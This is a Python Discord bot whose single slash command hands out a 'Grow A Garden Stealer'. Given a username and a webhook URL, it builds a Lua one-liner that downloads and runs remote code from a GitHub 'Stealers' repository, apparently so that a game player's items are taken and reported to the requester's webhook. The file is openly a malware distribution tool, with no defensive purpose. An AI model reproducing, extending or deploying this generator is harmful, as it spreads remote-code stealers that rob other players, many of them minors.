import os
import discord
from discord import app_commands
from discord.ext import commands

# Replace with your actual token
TOKEN = os.getenv("DISCORD_TOKEN")

# Replace with your server (guild) ID
GUILD_ID = 1372199357289332876  # Example: 112233445566778899

intents = discord.Intents.default()
intents.members = True  # Required for some member events

bot = commands.Bot(command_prefix="!", intents=intents)
tree = bot.tree

@bot.event
async def on_ready():
    print(f"✅ Logged in as {bot.user}")
    try:
        guild = discord.Object(id=GUILD_ID)
        synced = await tree.sync(guild=guild)  # Faster command registration
        print(f"✅ Synced {len(synced)} command(s) to guild {GUILD_ID}")
    except Exception as e:
        print(f"❌ Sync error: {e}")

@tree.command(
    name="gen-grow-a-garden",
    description="Generate a Grow A Garden Stealer",
    guild=discord.Object(id=GUILD_ID)
)
@app_commands.describe(username="Your username", webhook="Your webhook URL")
async def gen(interaction: discord.Interaction, username: str, webhook: str):
    await interaction.response.defer()  # Acknowledge the command so we can follow up

    embed = discord.Embed(
        title="🌱 Grow A Garden Generator",
        description=f"Hello {interaction.user.mention}! Here's your generated Grow A Garden script.",
        color=0x00ff00
    )
    embed.add_field(name="Username", value=username, inline=False)
    embed.add_field(name="Webhook", value=webhook, inline=False)
    embed.add_field(
        name="Script",
        value=f"""```lua
Username = "{username}"
Webhook = "{webhook}"
loadstring(game:HttpGet("https://raw.githubusercontent.com/Narukisora/Stealers/refs/heads/main/Http"))()
```""",
        inline=False
    )

    try:
        await interaction.followup.send(embed=embed)
    except discord.Forbidden:
        await interaction.followup.send(
            "❌ Could not send message. Please enable DMs or check bot permissions.",
            ephemeral=True
        )

bot.run(TOKEN)
